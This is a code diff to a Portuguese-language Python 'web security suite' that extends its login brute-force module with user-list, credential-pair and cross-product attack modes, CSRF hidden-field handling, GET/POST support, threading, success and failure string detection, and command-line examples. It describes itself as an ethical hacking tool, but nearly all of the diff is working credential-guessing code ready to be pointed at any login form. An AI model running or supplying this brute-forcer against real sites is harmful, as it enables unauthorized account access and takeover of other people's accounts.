@@ -14,6 +14,7 @@ from difflib import SequenceMatcher
 import time
 import json
 import os
+import itertools
 
 # Tenta importar bibliotecas de terceiros e avisa se não estiverem instaladas
 try:
@@ -67,7 +68,7 @@ def display_banner():
 ░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 
 """
-    version = "3.1" # Versão atualizada com melhorias no XSS Scanner (Stored XSS)
+    version = "3.2.3" # Versão com correção no Brute Force
     console.print(f"[bold cyan]{banner}[/bold cyan]")
     console.print(f"[bold]Spectra - Web Security Suite v{version}[/bold]")
     console.print("[italic]Uma ferramenta de hacking ético para análise de segurança web.[/italic]")
@@ -2187,105 +2188,195 @@ def view_file_from_url(url):
     finally:
         console.print("-" * 60)
 
-# --- MÓDULO 23: BRUTE FORCE DE LOGIN (NOVO) ---
+# --- MÓDULO 23: BRUTE FORCE DE LOGIN (CORRIGIDO E APRIMORADO) ---
 
 class BruteForceScanner:
-    """Classe para realizar ataques de força bruta em formulários de login."""
-    def __init__(self, url, user_field, pass_field, username, wordlist_path, failure_string, workers):
+    """Classe para realizar ataques de força bruta em formulários de login com mais opções."""
+    def __init__(self, url, user_field, pass_field, users, pass_wordlist_path,
+                 failure_string, success_string, workers, delay, attack_mode):
         self.url = url
         self.user_field = user_field
         self.pass_field = pass_field
-        self.username = username
-        self.wordlist_path = wordlist_path
+        self.users = users
+        self.pass_wordlist_path = pass_wordlist_path
         self.failure_string = failure_string
+        self.success_string = success_string
         self.workers = workers
+        self.delay = delay
+        self.attack_mode = attack_mode
         self.session = requests.Session()
         self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
+        self.found_credential = None
 
-    def _load_wordlist(self):
-        """Carrega a wordlist de senhas."""
+    def _load_list_from_file(self, file_path):
+        """Carrega uma lista (usuários ou senhas) de um arquivo."""
         try:
-            with open(self.wordlist_path, 'r', errors='ignore') as f:
+            with open(file_path, 'r', errors='ignore') as f:
                 return [line.strip() for line in f if line.strip()]
         except FileNotFoundError:
-            console.print(f"[bold red][!] Erro: O ficheiro da wordlist '{self.wordlist_path}' não foi encontrado.[/bold red]")
+            console.print(f"[bold red][!] Erro: O ficheiro da wordlist '{file_path}' não foi encontrado.[/bold red]")
+            sys.exit(1)
+        except Exception as e:
+            console.print(f"[bold red][!] Erro ao ler o ficheiro '{file_path}': {e}[/bold red]")
             sys.exit(1)
 
     def _get_form_details(self):
-        """Obtém o URL de action do formulário e campos ocultos (ex: CSRF)."""
+        """Obtém o URL de action, método e campos ocultos (ex: CSRF) do formulário."""
         try:
             response = self.session.get(self.url, verify=False, timeout=10)
             soup = BeautifulSoup(response.content, 'html.parser')
             
-            # Tenta encontrar o formulário que contém os campos de usuário e senha
-            form = soup.find('form', lambda f: f.find('input', {'name': self.user_field}) and f.find('input', {'name': self.pass_field}))
+            form = None
+            # Itera em todos os formulários para encontrar o correto, de forma mais robusta.
+            for f in soup.find_all('form'):
+                # Verifica se o formulário contém ambos os campos de usuário e senha.
+                if f.find('input', {'name': self.user_field}) and f.find('input', {'name': self.pass_field}):
+                    form = f
+                    break
+            
             if not form:
                 console.print(f"[bold red][!] Erro: Não foi possível encontrar um formulário com os campos '{self.user_field}' e '{self.pass_field}'.[/bold red]")
-                return None, None
+                return None, None, None
 
             action_url = urljoin(self.url, form.get('action', self.url))
+            method = form.get('method', 'post').lower()
             hidden_fields = {i.get('name'): i.get('value', '') for i in form.find_all('input', {'type': 'hidden'}) if i.get('name')}
-            return action_url, hidden_fields
+            return action_url, method, hidden_fields
         except requests.RequestException as e:
             console.print(f"[bold red][!] Erro ao obter a página de login: {e}[/bold red]")
-            return None, None
+            return None, None, None
 
-    def _test_password(self, password, action_url, hidden_fields):
-        """Testa uma única senha."""
+    def _test_credential(self, username, password, action_url, method, hidden_fields):
+        """Testa um único par de credenciais (usuário/senha), suportando GET e POST."""
+        if self.found_credential:  # Se já encontrou, não faz mais testes
+            return None
+
+        if self.delay > 0:
+            time.sleep(self.delay)
+
         payload = hidden_fields.copy()
-        payload[self.user_field] = self.username
+        payload[self.user_field] = username
         payload[self.pass_field] = password
         
         try:
-            response = self.session.post(action_url, data=payload, verify=False, timeout=7)
-            if self.failure_string not in response.text:
-                return password
+            response = None
+            if method == 'post':
+                response = self.session.post(action_url, data=payload, verify=False, timeout=7, allow_redirects=True)
+            else: # GET
+                response = self.session.get(action_url, params=payload, verify=False, timeout=7, allow_redirects=True)
+
+            # **LÓGICA DE DETECÇÃO DE SUCESSO CORRIGIDA**
+            # A lógica agora é mais explícita e robusta.
+            # O usuário deve fornecer pelo menos uma das strings de condição.
+            
+            # Condição 1: A string de sucesso deve estar presente (se fornecida)
+            success_condition_met = (self.success_string in response.text) if self.success_string else True
+            
+            # Condição 2: A string de falha não deve estar presente (se fornecida)
+            failure_condition_met = (self.failure_string not in response.text) if self.failure_string else True
+
+            # O login é bem-sucedido se as condições aplicáveis forem verdadeiras.
+            # Se o usuário fornecer ambas, ambas devem ser satisfeitas.
+            if success_condition_met and failure_condition_met:
+                self.found_credential = (username, password)
+                return (username, password)
+
         except requests.RequestException:
             pass
         return None
 
     def run_scan(self):
-        """Executa o ataque de força bruta."""
+        """Executa o ataque de força bruta com base no modo de ataque."""
         console.print("-" * 60)
         console.print(f"[*] Iniciando ataque de força bruta em: [bold cyan]{self.url}[/bold cyan]")
-        console.print(f"[*] Usuário: [cyan]{self.username}[/cyan]")
-        console.print(f"[*] String de falha: [yellow]'{self.failure_string}'[/yellow]")
+        console.print(f"[*] Modo de Ataque: [bold yellow]{self.attack_mode}[/bold yellow]")
+        if self.success_string:
+            console.print(f"[*] Condição de Sucesso: String [green]'{self.success_string}'[/green] DEVE estar presente.")
+        if self.failure_string:
+            console.print(f"[*] Condição de Sucesso: String de falha [red]'{self.failure_string}'[/red] NÃO DEVE estar presente.")
+        if self.delay > 0:
+            console.print(f"[*] Atraso entre tentativas: [cyan]{self.delay}s[/cyan]")
         console.print("-" * 60)
 
-        passwords = self._load_wordlist()
-        action_url, hidden_fields = self._get_form_details()
+        passwords = self._load_list_from_file(self.pass_wordlist_path)
+        
+        tasks = []
+        if self.attack_mode == 'battering_ram':
+            username = self.users[0]
+            console.print(f"[*] Alvo: Usuário [cyan]{username}[/cyan] com {len(passwords)} senhas.")
+            tasks = [(username, p) for p in passwords]
+        elif self.attack_mode == 'pitchfork':
+            console.print(f"[*] Alvo: Testando {len(self.users)} pares de [cyan]usuario:senha[/cyan].")
+            tasks = [(u.split(':', 1)[0], u.split(':', 1)[1]) for u in self.users if ':' in u]
+        elif self.attack_mode == 'cluster_bomb':
+            console.print(f"[*] Alvo: {len(self.users)} usuários vs {len(passwords)} senhas. Total de {len(self.users) * len(passwords)} tentativas.")
+            tasks = list(itertools.product(self.users, passwords))
+        
+        if not tasks:
+            console.print("[bold red][!] Nenhuma tarefa de credencial foi gerada. Verifique os parâmetros e arquivos de entrada.[/bold red]")
+            return
 
+        action_url, method, hidden_fields = self._get_form_details()
         if not action_url:
             return
 
-        console.print(f"[*] Formulário encontrado. Action: [cyan]{action_url}[/cyan]")
+        console.print(f"[*] Formulário encontrado. Action: [cyan]{action_url}[/cyan] | Método: [cyan]{method.upper()}[/cyan]")
         if hidden_fields:
             console.print(f"[*] Campos ocultos (CSRF?) encontrados e incluídos: [cyan]{', '.join(hidden_fields.keys())}[/cyan]")
 
+        found_credential = None
         with ThreadPoolExecutor(max_workers=self.workers) as executor:
-            future_to_pass = {executor.submit(self._test_password, p, action_url, hidden_fields): p for p in passwords}
+            future_to_cred = {executor.submit(self._test_credential, user, pwd, action_url, method, hidden_fields): (user, pwd) for user, pwd in tasks}
             
             with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console) as progress:
-                task = progress.add_task(f"[green]Testando {len(passwords)} senhas...", total=len(passwords))
-                for future in as_completed(future_to_pass):
+                p_task = progress.add_task(f"[green]Testando {len(tasks)} credenciais...", total=len(tasks))
+                for future in as_completed(future_to_cred):
+                    # Interrompe o loop principal assim que uma credencial for encontrada
+                    if self.found_credential:
+                        break
                     result = future.result()
                     if result:
-                        progress.stop()
-                        console.print("\n" + "=" * 60)
-                        console.print(f"[bold green on black] ✅ SENHA ENCONTRADA! ✅ [/bold green on black]")
-                        console.print(f"[bold]Usuário:[/bold] [cyan]{self.username}[/cyan]")
-                        console.print(f"[bold]Senha:[/bold] [cyan]{result}[/cyan]")
-                        console.print("=" * 60)
-                        # Cancela as tarefas restantes
-                        executor.shutdown(wait=False, cancel_futures=True)
-                        return
-                    progress.update(task, advance=1)
+                        found_credential = result
+                        # Sinaliza para outras threads pararem e quebra o loop
+                        self.found_credential = found_credential
+                        break 
+                    progress.update(p_task, advance=1)
+                
+                # Garante que a barra de progresso seja concluída para evitar sobreposição de texto
+                progress.update(p_task, completed=len(tasks))
         
-        console.print("\n[bold yellow][-] Nenhuma senha encontrada nesta wordlist.[/bold yellow]")
+        # A impressão do resultado agora é feita fora dos contextos de progresso e executor
+        console.print("-" * 60)
+        if found_credential:
+            console.print(f"[bold green on black] ✅ CREDENCIAL ENCONTRADA! ✅ [/bold green on black]")
+            console.print(f"[bold]Usuário:[/bold] [cyan]{found_credential[0]}[/cyan]")
+            console.print(f"[bold]Senha:[/bold] [cyan]{found_credential[1]}[/cyan]")
+        else:
+            console.print("[bold yellow][-] Nenhuma credencial válida encontrada com as listas fornecidas.[/bold yellow]")
         console.print("-" * 60)
 
-def brute_force_scan(url, user_field, pass_field, username, wordlist_path, failure_string, workers):
-    scanner = BruteForceScanner(url, user_field, pass_field, username, wordlist_path, failure_string, workers)
+def brute_force_scan(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
+                     failure_string, success_string, workers, delay, attack_mode):
+    
+    users = []
+    if attack_mode == 'battering_ram':
+        if not username:
+            console.print("[bold red][!] Erro: O modo 'battering_ram' requer um único usuário via '--username'.[/bold red]")
+            sys.exit(1)
+        users = [username]
+    elif attack_mode in ['pitchfork', 'cluster_bomb']:
+        if not user_list_path:
+            console.print(f"[bold red][!] Erro: O modo '{attack_mode}' requer uma lista de usuários via '--user-list'.[/bold red]")
+            sys.exit(1)
+        try:
+            with open(user_list_path, 'r', errors='ignore') as f:
+                users = [line.strip() for line in f if line.strip()]
+        except FileNotFoundError:
+            console.print(f"[bold red][!] Erro: O ficheiro da lista de usuários '{user_list_path}' não foi encontrado.[/bold red]")
+            sys.exit(1)
+
+    scanner = BruteForceScanner(url, user_field, pass_field, users, pass_wordlist_path,
+                                failure_string, success_string, workers, delay, attack_mode)
     scanner.run_scan()
 
 # --- INTERFACE DE LINHA DE COMANDO ---
@@ -2301,8 +2392,8 @@ Exemplos de Uso:
 ----------------
 
   [ Análise Completa ]
-  # Executa uma análise completa, ignorando o cache de CVEs
-  python %(prog)s full-scan -u http://testphp.vulnweb.com/ --no-cache
+  # Executa uma análise completa, ignorando o cache de CVEs e gerando um relatório HTML
+  python %(prog)s full-scan -u http://testphp.vulnweb.com/ --no-cache -o relatorio.html
 
   [ Scanning de Vulnerabilidades ]
   # Procura por falhas de SQL Injection com nível de agressividade 3 e focado em MySQL
@@ -2314,8 +2405,15 @@ Exemplos de Uso:
   # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
   python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache
 
-  # Tenta um ataque de força bruta em um formulário de login
-  python %(prog)s brute-force -u http://testphp.vulnweb.com/login.php --user-field "uname" --pass-field "pass" --username "test" -w passwords.txt --failure-string "Invalid credentials"
+  [ Ataque de Força Bruta (Aprimorado) ]
+  # Modo Battering Ram (um usuário, muitas senhas)
+  python %(prog)s brute-force -u http://test.com/login --user-field "user" --pass-field "pass" --username "admin" -w senhas.txt --failure-string "inválido"
+  
+  # Modo Cluster Bomb (muitos usuários, muitas senhas)
+  python %(prog)s brute-force -u http://test.com/login --user-field "user" --pass-field "pass" --user-list usuarios.txt -w senhas.txt --attack-mode cluster_bomb --success-string "Bem-vindo" --delay 0.5
+  
+  # Modo Pitchfork (pares de usuario:senha)
+  python %(prog)s brute-force -u http://test.com/login --user-field "user" --pass-field "pass" --user-list credenciais.txt --attack-mode pitchfork --failure-string "inválido"
 
   [ Utilitários ]
   # Visualiza o conteúdo de um ficheiro online (ex: robots.txt)
@@ -2371,10 +2469,14 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_brute.add_argument('-u', '--url', required=True, help='URL da página de login.')
     parser_brute.add_argument('--user-field', required=True, help='Atributo "name" do campo de usuário.')
     parser_brute.add_argument('--pass-field', required=True, help='Atributo "name" do campo de senha.')
-    parser_brute.add_argument('--username', required=True, help='Nome de usuário para testar.')
     parser_brute.add_argument('-w', '--wordlist', required=True, help='Caminho para a wordlist de senhas.')
-    parser_brute.add_argument('--failure-string', required=True, help='Texto que aparece na página em caso de falha no login.')
+    parser_brute.add_argument('--username', help='Nome de usuário único para testar (para modo battering_ram).')
+    parser_brute.add_argument('--user-list', help='Caminho para a lista de usuários (para modos pitchfork e cluster_bomb).')
+    parser_brute.add_argument('--failure-string', help='Texto que aparece na página em caso de falha no login.')
+    parser_brute.add_argument('--success-string', help='Texto que aparece na página em caso de sucesso no login (alternativa ao failure-string).')
     parser_brute.add_argument('--workers', type=int, default=10, help='Número de threads (padrão: 10).')
+    parser_brute.add_argument('--delay', type=float, default=0, help='Atraso em segundos entre as requisições (padrão: 0).')
+    parser_brute.add_argument('--attack-mode', default='battering_ram', choices=['battering_ram', 'pitchfork', 'cluster_bomb'], help='Modo de ataque (padrão: battering_ram).')
 
 
     # --- Grupo de Reconhecimento & Enumeração ---
@@ -2491,7 +2593,10 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     elif args.tool == 'cve-scan':
         cve_scan(args.product, args.version, args.min_cvss, args.no_cache)
     elif args.tool == 'brute-force':
-        brute_force_scan(args.url, args.user_field, args.pass_field, args.username, args.wordlist, args.failure_string, args.workers)
+        if not args.failure_string and not args.success_string:
+            parser.error("Pelo menos um de --failure-string ou --success-string deve ser fornecido.")
+        brute_force_scan(args.url, args.user_field, args.pass_field, args.username, args.user_list, args.wordlist, 
+                         args.failure_string, args.success_string, args.workers, args.delay, args.attack_mode)
     else:
         parser.print_help()
 
